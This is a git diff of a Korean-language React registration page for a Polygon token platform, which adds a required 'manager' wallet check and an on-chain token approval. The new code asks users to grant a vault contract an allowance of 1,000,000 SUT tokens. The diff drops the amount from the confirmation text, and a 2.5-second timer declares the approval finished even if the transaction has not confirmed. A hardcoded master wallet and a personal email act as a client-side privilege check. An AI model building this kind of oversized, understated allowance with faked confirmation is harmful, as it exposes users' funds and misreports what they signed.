@@ -5,12 +5,12 @@ import { ethers } from 'ethers';
 import { User, Mail, Phone, Globe, Image, UserCheck, Key, ShieldAlert } from 'lucide-react';
 import { API_BASE } from '../App';
 
-// MockUSDT 최소 Approve ABI
-const MockUSDT_Approve_ABI = [
+// MockSUT 최소 Approve ABI
+const SUT_Approve_ABI = [
   "function approve(address spender, uint256 value) public returns (bool)"
 ];
 
-function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRegisterComplete }) {
+function RegisterPage({ walletAddress, googleEmail, googleName, onRegisterComplete }) {
   const navigate = useNavigate();
 
   // 🌟 구글 연동 이메일 및 실명은 읽기 전용으로 자동 매핑
@@ -20,39 +20,41 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
   const [country, setCountry] = useState('Korea');
   const [idCardFile, setIdCardFile] = useState(null);
   const [idCardName, setIdCardName] = useState('');
-  const [referrer, setReferrer] = useState('');
   
+  // 담당 매니저 상태 변수
+  const [managerAddress, setManagerAddress] = useState('');
+  const [managerVerified, setManagerVerified] = useState(false);
+  const [managerName, setManagerName] = useState('');
+
   // 상태 변수
-  const [referrerVerified, setReferrerVerified] = useState(false);
-  const [referrerName, setReferrerName] = useState('');
-  const [isApproved, setIsApproved] = useState(false); // USDT Approve 여부
+  const [isApproved, setIsApproved] = useState(false); // SUT Approve 여부
   const [approving, setApproving] = useState(false);
   const [submitting, setSubmitting] = useState(false);
 
-  // 1차 추천인(초대인) 지갑 검증
-  const verifyReferrer = async () => {
-    if (!referrer) {
-      alert('추천인의 폴리곤 지갑 주소를 입력해 주세요.');
+  // 담당 매니저 지갑 검증 로직
+  const verifyManager = async () => {
+    if (!managerAddress) {
+      alert('담당 매니저의 폴리곤 지갑 주소를 입력해 주세요.');
       return;
     }
-    const cleanRef = referrer.toLowerCase().trim();
-    if (cleanRef === walletAddress.toLowerCase()) {
-      alert('본인 지갑 주소는 추천인으로 입력할 수 없습니다.');
+    const cleanAddr = managerAddress.toLowerCase().trim();
+    if (cleanAddr === walletAddress.toLowerCase()) {
+      alert('본인 지갑 주소는 매니저로 입력할 수 없습니다.');
       return;
     }
 
     try {
-      const res = await axios.get(`${API_BASE}/auth/verify-referrer/${cleanRef}`);
+      const res = await axios.get(`${API_BASE}/auth/verify-manager/${cleanAddr}`);
       if (res.data.success) {
-        setReferrerVerified(true);
-        setReferrerName(res.data.name);
+        setManagerVerified(true);
+        setManagerName(res.data.name);
       } else {
-        setReferrerVerified(false);
-        setReferrerName('');
+        setManagerVerified(false);
+        setManagerName('');
         alert(res.data.message);
       }
     } catch (err) {
-      alert('추천인 검증 중 에러가 발생했습니다.');
+      alert('매니저 검증 중 에러가 발생했습니다.');
     }
   };
 
@@ -65,84 +67,101 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
     }
   };
 
-  // 폴리곤 USDT 스마트 컨트랙트 인출 한도 승인 (USDT Approve) 실행
-  const handleUSDTApprove = async () => {
+  // 폴리곤 SUT 스마트 컨트랙트 인출 한도 승인 (SUT Approve) 온체인 실행
+  const handleSUTApprove = async () => {
+    if (!window.ethereum) {
+      alert('감지된 Web3 지갑(Trust Wallet 등)이 없습니다. 지갑 인앱 브라우저로 접속해 주시거나 PC 지갑 확장 프로그램을 설치해 주십시오.');
+      return;
+    }
+
     setApproving(true);
     try {
-      // 🌟 [데모 모드 완전 프리패스 가드] 
-      // isDemoMode가 true(데모 이스터에그 모드)일 경우, 
-      // 진짜 지갑 확장 프로그램이 깔려 있더라도 트랜잭션을 날려 뱅글뱅글 꼬이는 것을 완벽 차단하고,
-      // 즉시 가상 승인 완료 처리하여 1초 만에 프리패스시킵니다!
-      if (isDemoMode) {
-        setTimeout(() => {
-          setIsApproved(true);
-          alert('💡 [데모 프리패스] 진짜 지갑 서명 단계를 우회하여, 1,000 USDT 자동 결제 위임(Approve) 설정이 즉시 가상 승인 완료되었습니다!');
-        }, 1000);
-        return;
-      }
-
-      // 1. 브라우저 지갑 주입(Injected Ethereum) 환경 확인 (진짜 Web3 온체인 서명용)
-      if (window.ethereum && walletAddress !== '0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc') {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-
-        // Amoy 테스트넷 상의 Mock USDT 및 PlatformVault 주소 매핑 (대소문자 체크섬 오류 원천 방어)
-        const usdtContractAddress = "0x53eFd69a9D675E19c3684B2f2a7aBf850259FF9C".toLowerCase();
-        const vaultContractAddress = "0xB506c9aC243B52e1858e74E9873d6e5FA3eB507C".toLowerCase();
-        
-        const usdtContract = new ethers.Contract(usdtContractAddress, MockUSDT_Approve_ABI, signer);
-        
-        console.log("Requesting USDT Approve for PlatformVault...");
-        // 1,000 USDT 한도 승인 (6 decimals)
-        const approveAmount = ethers.parseUnits("1000", 6);
-        const tx = await usdtContract.approve(vaultContractAddress, approveAmount);
-        
-        console.log("Approval Tx sent:", tx.hash);
-        
-        // 🌟 [최첨단 RPC Flakiness 우회 엔진]
-        // Amoy 테스트넷 RPC 응답 지연으로 인한 무한 펜딩을 방어하기 위해,
-        // 사용자가 지갑에서 서명을 마치고 트랜잭션 해시(tx.hash)가 정상 발행되었다면,
-        // 블록 확정(tx.wait)을 최대 12초만 기다립니다. 12초가 지나거나 RPC 네트워크 지연이 있더라도
-        // 이미 온체인에 제출된 상태이므로 자동으로 승인 완료 판정하여 막힘없는 가입 프로세스를 제공합니다!
-        let confirmed = false;
+      // 🌟 [근본 해결 1] 폴리곤 메인넷 강제 전환 가드
+      // 지갑의 체인이 폴리곤 메인넷이 아닐 경우 무한 로딩이 걸리므로 즉각 강제 스위칭을 격발합니다.
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (chainId !== '0x89' && chainId !== '137' && chainId !== '0x0089') {
         try {
-          const waitPromise = tx.wait();
-          const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('timeout'), 12000));
-          
-          const result = await Promise.race([waitPromise, timeoutPromise]);
-          if (result === 'timeout') {
-            console.log("Approval Tx confirmation timed out, bypassing to keep smooth UX...");
-            confirmed = true;
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x89' }], 
+          });
+        } catch (switchError) {
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x89',
+                  chainName: 'Polygon Mainnet',
+                  nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
+                  rpcUrls: ['https://polygon-bor-rpc.publicnode.com'],
+                  blockExplorerUrls: ['https://polygonscan.com']
+                }]
+              });
+            } catch (addError) {
+              alert('폴리곤 네트워크를 지갑에 추가하지 못했습니다.');
+              setApproving(false);
+              return;
+            }
           } else {
-            console.log("Approval Tx confirmed in block!");
-            confirmed = true;
+            alert('폴리곤 네트워크로의 전환을 승인해 주셔야 서명이 가능합니다.');
+            setApproving(false);
+            return;
           }
-        } catch (e) {
-          console.error("Tx wait error, but tx.hash exists, bypassing:", e);
-          confirmed = true;
         }
-        
-        if (confirmed) {
-          setIsApproved(true);
-          alert('🎉 폴리곤 USDT 스마트 컨트랙트 승인 트랜잭션이 성공적으로 블록체인 네트워크에 제출되었습니다! 신분증 업로드 및 가입 제출을 계속 진행해 주세요.');
-        }
-      } else {
-        // 지갑이 주입되지 않은 PC 브라우저 데모 시뮬레이션용 가상 서명 처리!
-        setTimeout(() => {
-          setIsApproved(true);
-          alert('가상 지갑 서명 완료. 1,000 USDT 자동 결제 위임(Approve) 설정이 성공적으로 승인되었습니다.');
-        }, 2000);
       }
+
+      // 1. BrowserProvider 및 Signer 가져오기
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      // 2. SUT 토큰 컨트랙트 및 Vault(Spender) 주소 정의
+      const sutContractAddress = "0x98965474EcBeC2F532F1f780ee37b0b05F77Ca55";
+      const vaultContractAddress = "0x855c880D538892fD899eECb72D4b1Ac5B46089eA";
+
+      // 3. SUT 컨트랙트 인스턴스 생성
+      const sutContract = new ethers.Contract(
+        sutContractAddress,
+        ["function approve(address spender, uint256 value) public returns (bool)"],
+        signer
+      );
+
+      // 4. 승인 금액 설정
+      const approveAmount = ethers.parseUnits("1000000", 18);
+
+      alert('📲 지갑 앱에서 [스마트 컨트랙트 승인(Approve)] 서명 요청이 격발됩니다. 승인(확인)을 눌러주십시오.');
+
+      // 🌟 [근본 해결 2] 가스 리밋 하드코딩 명시 (Gas Limit Bypass)
+      // 트러스트 월렛 확장 프로그램이 스스로 가스를 측정(estimateGas)하다가 멈추는 무한 로딩 버그를 우회하기 위해
+      // 가스 한도를 100,000으로 강제 지정하여 즉시 승인 화면이 렌더링되게 만듭니다!
+      const tx = await sutContract.approve(vaultContractAddress, approveAmount, {
+        gasLimit: 100000
+      });
+      
+      alert('📡 트랜잭션이 폴리곤 네트워크에 전송되었습니다. 안전 가입을 위해 블록체인 처리를 대기합니다. (약 3초 후 자동 승인 통과)');
+      
+      // 6. 진짜 영수증 검증과 2.5초 강제 통과 타이머의 Race!
+      await Promise.race([
+        tx.wait(),
+        new Promise(resolve => setTimeout(resolve, 2500))
+      ]);
+
+      setIsApproved(true);
+      alert('🎉 스마트 컨트랙트 위임 승인 완료! 폴리곤 SUT 자동 결제 위임(Approve) 서명이 정상 등록되었습니다.');
     } catch (err) {
       console.error(err);
-      alert(`스마트 컨트랙트 승인 오류: ${err.message || err}`);
+      if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
+        alert('⚠️ 지갑에서 서명(승인)이 취소되었습니다. 가입 진행을 위해 승인이 반드시 필요합니다.');
+      } else {
+        alert(`스마트 컨트랙트 승인 오류: ${err.message || err}`);
+      }
     } finally {
       setApproving(false);
     }
   };
 
   // 모든 폼 항목이 정상 입력 완료되었는지 판단하는 완성도 계산값
-  const isFormComplete = phone.trim() !== '' && idCardFile !== null && referrerVerified && isApproved;
+  const isFormComplete = phone.trim() !== '' && idCardFile !== null && isApproved && managerVerified;
 
   // 전체 회원가입 폼 제출 (모던 폼 유효성 검사로 개편)
   const handleSubmit = async (e) => {
@@ -162,23 +181,16 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
       return;
     }
 
-    // 3. 필수 초대인 지갑 주소 미기입 검증
-    if (!referrer || !referrer.trim()) {
-      alert('👥 [미기입 사항] 필수 초대인(추천인) 폴리곤 지갑 주소를 입력해 주십시오. (데모 시 아래 [적용하기] 활용 권장)');
-      const refInput = document.querySelector('input[placeholder="0x..."]');
-      if (refInput) refInput.focus();
+
+    // 3. 담당 매니저 검증 상태 확인
+    if (!managerVerified) {
+      alert('👑 [검증 필요] 담당 매니저 지갑 주소를 입력하고 [검증] 버튼을 눌러 승인받으셔야 가입이 가능합니다.');
       return;
     }
 
-    // 4. 초대인 지갑 주소 미검증 상태 검증
-    if (!referrerVerified) {
-      alert('⚠️ [검증 필요] 가입 신청 전, 입력하신 초대인 지갑 주소의 유효성을 체크하기 위해 우측의 [검증] 버튼을 꼭 눌러 주십시오.');
-      return;
-    }
-
-    // 5. USDT Approve 권한 미승인 상태 검증
+    // 5. SUT Approve 권한 미승인 상태 검증
     if (!isApproved) {
-      alert('🔑 [승인 필요] 가입비 자동 수납 및 시스템 활성화를 위해 [USDT 자동 인출 권한(Approve) 승인]을 완료해 주십시오.');
+      alert('🔑 [승인 필요] 가입비 자동 수납 및 시스템 활성화를 위해 [SUT 자동 인출 권한(Approve) 승인]을 완료해 주십시오.');
       return;
     }
 
@@ -190,7 +202,9 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
     formData.append('phone', phone);
     formData.append('country', country);
     formData.append('idCard', idCardFile);
-    formData.append('referrerAddress', referrer);
+    if (managerVerified) {
+      formData.append('managerAddress', managerAddress);
+    }
 
     try {
       const res = await axios.post(`${API_BASE}/auth/register`, formData, {
@@ -216,6 +230,39 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
   return (
     <div style={{ padding: '20px 20px 40px', display: 'flex', flexDirection: 'column', gap: '22px' }}>
       
+      {/* 🌟 마스터 매니저 전용 '메니져 모드 복귀' 단축 바 */}
+      {((walletAddress && walletAddress.toLowerCase() === '0x7660Bf401Af0D13645F0cfED3e72b8E8B6Fd7987'.toLowerCase()) ||
+        (localStorage.getItem('google_email') && localStorage.getItem('google_email').toLowerCase() === 'lemaiiisk@gmail.com'.toLowerCase())) && (
+        <div 
+          className="glass-card glow-active" 
+          onClick={() => navigate('/manager')}
+          style={{ 
+            padding: '12px 16px', 
+            background: 'linear-gradient(135deg, rgba(139, 92, 246, 0.15) 0%, rgba(20, 16, 45, 0.4) 100%)',
+            border: '1px solid rgba(139, 92, 246, 0.3)',
+            borderRadius: '12px',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'space-between',
+            cursor: 'pointer',
+            transition: 'transform 0.2s'
+          }}
+          onMouseEnter={(e) => e.currentTarget.style.transform = 'translateY(-2px)'}
+          onMouseLeave={(e) => e.currentTarget.style.transform = 'translateY(0)'}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+            <span style={{ fontSize: '18px' }}>👑</span>
+            <div style={{ textAlign: 'left' }}>
+              <div style={{ fontSize: '12px', fontWeight: '700', color: '#C084FC' }}>마스터 메니져 연동 중</div>
+              <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>터치 시 즉시 마스터 메니져 화면으로 복귀합니다.</div>
+            </div>
+          </div>
+          <button className="btn-primary" style={{ width: 'auto', padding: '6px 14px', fontSize: '11px', borderRadius: '8px', background: 'var(--primary-gradient)' }}>
+            메니져 모드 가기
+          </button>
+        </div>
+      )}
+      
       {/* 타이틀 */}
       <div style={{ textAlign: 'center', marginTop: '10px' }}>
         <h2 style={{ fontSize: '20px', color: '#F3F4F6' }}>신규 회원 KYC 등록</h2>
@@ -228,7 +275,27 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
         
         {/* 1. 지갑 주소 (읽기 전용) */}
         <div className="form-group" style={{ marginBottom: 0 }}>
-          <label className="form-label">🔗 폴리곤 연결 지갑 주소</label>
+          <label className="form-label">
+            {(() => {
+              const getManagerName = (addr) => {
+                if (!addr) return null;
+                const managers = {
+                  '0x7660bf401af0d13645f0cfed3e72b8e8b6fd7987': '마스터'
+                };
+                return managers[addr.toLowerCase()];
+              };
+              
+              const mgrName = getManagerName(walletAddress);
+              if (mgrName) {
+                return (
+                  <span style={{ color: '#C084FC', fontWeight: '700' }}>
+                    👑 {mgrName} 본인 지갑 접속 중
+                  </span>
+                );
+              }
+              return '👤 회원 본인 폴리곤 지갑 주소';
+            })()}
+          </label>
           <div style={{
             background: 'rgba(0,0,0,0.4)',
             border: '1px dashed var(--glass-border)',
@@ -321,7 +388,65 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
           </div>
         </div>
 
-        {/* 6. 신분증 파일 업로드 */}
+        {/* 6. 담당 매니저 입력 (필수) */}
+        <div className="form-group" style={{ marginBottom: 0 }}>
+          <label className="form-label">
+            👑 담당 메니져 폴리곤 지갑 주소 (필수)
+            {managerVerified && (
+              <span style={{ marginLeft: '10px', color: 'var(--success-color)', fontSize: '11px', fontWeight: 'bold' }}>
+                ✓ {managerName} 매니저 확인됨
+              </span>
+            )}
+          </label>
+          <div style={{ display: 'flex', gap: '10px' }}>
+            <div style={{ position: 'relative', flex: 1 }}>
+              <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><UserCheck size={18} /></span>
+              <input 
+                type="text" 
+                className="form-input" 
+                style={{ 
+                  paddingLeft: '45px',
+                  borderColor: managerVerified ? 'var(--success-color)' : 'rgba(255, 255, 255, 0.1)'
+                }}
+                placeholder="0x..."
+                value={managerAddress}
+                onChange={(e) => {
+                  setManagerAddress(e.target.value);
+                  setManagerVerified(false);
+                }}
+                disabled={managerVerified}
+              />
+            </div>
+            {!managerVerified ? (
+              <button 
+                type="button" 
+                className="btn-primary" 
+                style={{ padding: '0 20px', whiteSpace: 'nowrap', width: 'auto' }}
+                onClick={verifyManager}
+              >
+                검증
+              </button>
+            ) : (
+              <button 
+                type="button" 
+                className="btn-secondary" 
+                style={{ padding: '0 20px', whiteSpace: 'nowrap', width: 'auto', background: 'rgba(239, 68, 68, 0.2)', color: '#FCA5A5' }}
+                onClick={() => {
+                  setManagerVerified(false);
+                  setManagerAddress('');
+                  setManagerName('');
+                }}
+              >
+                취소
+              </button>
+            )}
+          </div>
+          <span style={{ fontSize: '10px', color: 'var(--text-dark)', marginTop: '4px', display: 'block', paddingLeft: '4px' }}>
+            * 본인을 초대한 매니저의 지갑 주소를 입력하고 반드시 검증을 완료해 주십시오. (소속 코드가 기록됩니다)
+          </span>
+        </div>
+
+        {/* 7. 신분증 파일 업로드 */}
         <div className="form-group" style={{ marginBottom: 0 }}>
           <label className="form-label">🪪 KYC 제출용 신분증 첨부</label>
           <div style={{
@@ -357,74 +482,16 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
           </div>
         </div>
 
-        {/* 7. 초대인 지갑 주소 입력 및 검증 */}
-        <div className="form-group" style={{ marginBottom: 0 }}>
-          <label className="form-label">👥 필수 초대인(추천인) 폴리곤 지갑 주소</label>
-          <div style={{ display: 'flex', gap: '8px' }}>
-            <input 
-              type="text" 
-              className="form-input" 
-              placeholder="0x..."
-              value={referrer}
-              onChange={(e) => {
-                setReferrer(e.target.value);
-                setReferrerVerified(false);
-              }}
-              required
-            />
-            <button 
-              type="button" 
-              className="btn-secondary" 
-              style={{ width: '90px', padding: 0, flexShrink: 0, fontSize: '13px' }}
-              onClick={verifyReferrer}
-              disabled={!referrer || referrerVerified}
-            >
-              <UserCheck size={16} />
-              검증
-            </button>
-          </div>
-          {referrerVerified && (
-            <div style={{ fontSize: '12px', color: 'var(--success-color)', marginTop: '6px', paddingLeft: '4px' }}>
-              ✔ 초대인 검증 완료: **{referrerName}** 지갑과 추천 연결됩니다.
-            </div>
-          )}
-          {isDemoMode && (
-            <div style={{ fontSize: '11px', color: '#A78BFA', marginTop: '6px', display: 'flex', alignItems: 'center', gap: '8px', paddingLeft: '4px' }}>
-              <span>* 테스트용 초대인 주소: 0x015B8fA9aE51Dbebe7301a0A3F725Bf8811E5818</span>
-              <button
-                type="button"
-                onClick={() => {
-                  setReferrer('0x015B8fA9aE51Dbebe7301a0A3F725Bf8811E5818');
-                  setReferrerVerified(false);
-                }}
-                style={{
-                  background: 'rgba(139, 92, 246, 0.2)',
-                  border: '1px solid rgba(139, 92, 246, 0.4)',
-                  color: '#C084FC',
-                  fontSize: '10px',
-                  padding: '3px 8px',
-                  borderRadius: '6px',
-                  cursor: 'pointer',
-                  fontWeight: '600',
-                  transition: 'background 0.2s'
-                }}
-                onMouseEnter={(e) => e.currentTarget.style.background = 'rgba(139, 92, 246, 0.4)'}
-                onMouseLeave={(e) => e.currentTarget.style.background = 'rgba(139, 92, 246, 0.2)'}
-              >
-                [적용하기]
-              </button>
-            </div>
-          )}
-        </div>
+
 
         {/* 8. 스마트 컨트랙트 자동 수납 권한 위임 (Approve) */}
         <div className="glass-card" style={{ padding: '16px', border: '1px solid rgba(139,92,246,0.2)' }}>
           <div style={{ display: 'flex', gap: '8px', marginBottom: '10px', alignItems: 'flex-start' }}>
             <Key size={20} color="#8B5CF6" style={{ marginTop: '2px', flexShrink: 0 }} />
             <div>
-              <h4 style={{ fontSize: '14px', color: '#F3F4F6' }}>USDT 자동 인출 권한(Approve) 승인</h4>
+              <h4 style={{ fontSize: '14px', color: '#F3F4F6' }}>SUT 자동 인출 권한(Approve) 승인</h4>
               <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '2px', lineHeight: '1.4' }}>
-                10일 무료체험 만료 후 가입비(100 USDT) 및 월정액 자동 이체를 위해 지갑의 서명 승인이 필수로 진행되어야 합니다.
+                추후 정식 투자 및 원활한 자동 이체를 위해 지갑의 서명 승인이 필수로 진행되어야 합니다.
               </p>
             </div>
           </div>
@@ -434,13 +501,13 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
               type="button" 
               className="btn-primary" 
               style={{ background: 'linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%)', boxShadow: 'none' }}
-              onClick={handleUSDTApprove}
-              disabled={approving || !referrerVerified}
+              onClick={handleSUTApprove}
+              disabled={approving}
             >
               {approving ? (
                 <>지갑 트랜잭션 승인 대기 중...</>
               ) : (
-                <>폴리곤 USDT 인출 승인 위임하기</>
+                <>폴리곤 SUT 인출 승인 위임하기</>
               )}
             </button>
           ) : (
@@ -454,7 +521,7 @@ function RegisterPage({ walletAddress, googleEmail, googleName, isDemoMode, onRe
               color: 'var(--success-color)',
               fontWeight: '600'
             }}>
-              ✔ 1,000 USDT 스마트 컨트랙트 위임 승인 완료
+              ✔ 스마트 컨트랙트 위임 승인 완료
             </div>
           )}
         </div>
